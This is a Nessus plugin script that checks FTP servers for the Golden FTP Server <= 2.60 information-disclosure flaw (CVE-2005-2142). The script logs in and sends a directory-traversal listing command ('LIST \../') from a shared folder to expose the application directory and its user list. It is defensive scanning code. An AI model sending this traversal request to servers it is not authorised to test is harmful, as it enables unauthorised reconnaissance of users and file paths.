#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(18615);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2005-2142");
  script_bugtraq_id(14124);

  name["english"] = "Golden FTP Server <= 2.60 Information Disclosure Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote FTP server is affected by information disclosure flaws.

Description :

The version of Golden FTP Server installed on the remote host is prone
to multiple information disclosure vulnerabilities.  Specifically, an
attacker can list the contents of the application directory, which
provides a list of valid users, and learn the absolute path of any
shared directories. 

Solution : 

Upgrade to Golden FTP Server 2.70 or later.

Risk factor : 

Low / CVSS Base Score : 2 
(AV:R/AC:L/Au:R/C:P/A:N/I:N/B:C)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for information disclosure vulnerabilities in Golden FTP Server <= 2.60";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("find_service.nes", "ftpserver_detect_type_nd_version.nasl", "ftp_overflow.nasl");
  script_require_keys("ftp/login", "ftp/password");
#  script_exclude_keys("ftp/false_ftp", "ftp/msftpd", "ftp/ncftpd", "ftp/fw1ftpd", "ftp/vxftpd");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");
include('global_settings.inc');


# nb: to exploit the vulnerability we need to log in.
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");
if (!user || !pass) {
  if (log_verbosity > 1) debug_print("ftp/login and/or ftp/password are empty; skipped!", level:0);
  exit(0);
}


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);

soc = open_sock_tcp(port);
if (!soc) exit(0);
if (!ftp_authenticate(socket:soc,  user:user, pass:pass)) {
  if (log_verbosity > 1) debug_print("can't login with supplied ftp credentials; skipped!", level:0);
  close(soc);
  exit(1);
}


# Make sure it's Golden FTP Server.
c = string("SYST");
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:4096);
if ("215 WIN32" >!< s) exit(0);


port2 = ftp_pasv(socket:soc);
if (!port2) exit(0);
soc2 = open_sock_tcp(port2, transport:ENCAPS_IP);
if (!soc2) exit(0);

# Identify shared directories on the remote.
c = string("LIST /");
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:4096);
if (s =~ "^1[0-9][0-9] ") {
  listing = ftp_recv_listing(socket:soc2);
  s = recv_line(socket:soc, length:4096);
}
close(soc2);
ndirs = 0;
foreach line (split(listing, keep:FALSE)) {
  if (line =~ "^d") {
    # nb: dirs may have spaces so we can't just use a simple regex.
    dirs[ndirs] = substr(line, 55);

    # 3 directories should be enough for testing.
    if (++ndirs > 3) break;
  }
}


# Try to exploit the vulnerability.
foreach dir (dirs) {
  # Change into the directory.
  c = string("CWD /", dir);
  send(socket:soc, data:string(c, "\r\n"));
  s = ftp_recv_line(socket:soc);
  if (egrep(string:s, pattern:"^250[ -]")) {
    port2 = ftp_pasv(socket:soc);
    if (!port2) exit(0);
    soc2 = open_sock_tcp(port2, transport:ENCAPS_IP);
    if (!soc2) exit(0);

    # Look for contents of the application directory.
    c = string("LIST \\../");
    send(socket:soc, data:string(c, "\r\n"));
    s = ftp_recv_line(socket:soc);
    if (egrep(string:s, pattern:"^1[0-9][0-9][ -]")) {
      listing = ftp_recv_listing(socket:soc2);
      s = recv_line(socket:soc, length:4096);

      # There's a problem if we see the .shr file for our username.
      if (string(" ", user, ".shr") >< listing) {
        security_note(port);
        break;
      }
    }

    close(soc2);
  }
}


# Close the connections.
ftp_close(socket:soc);
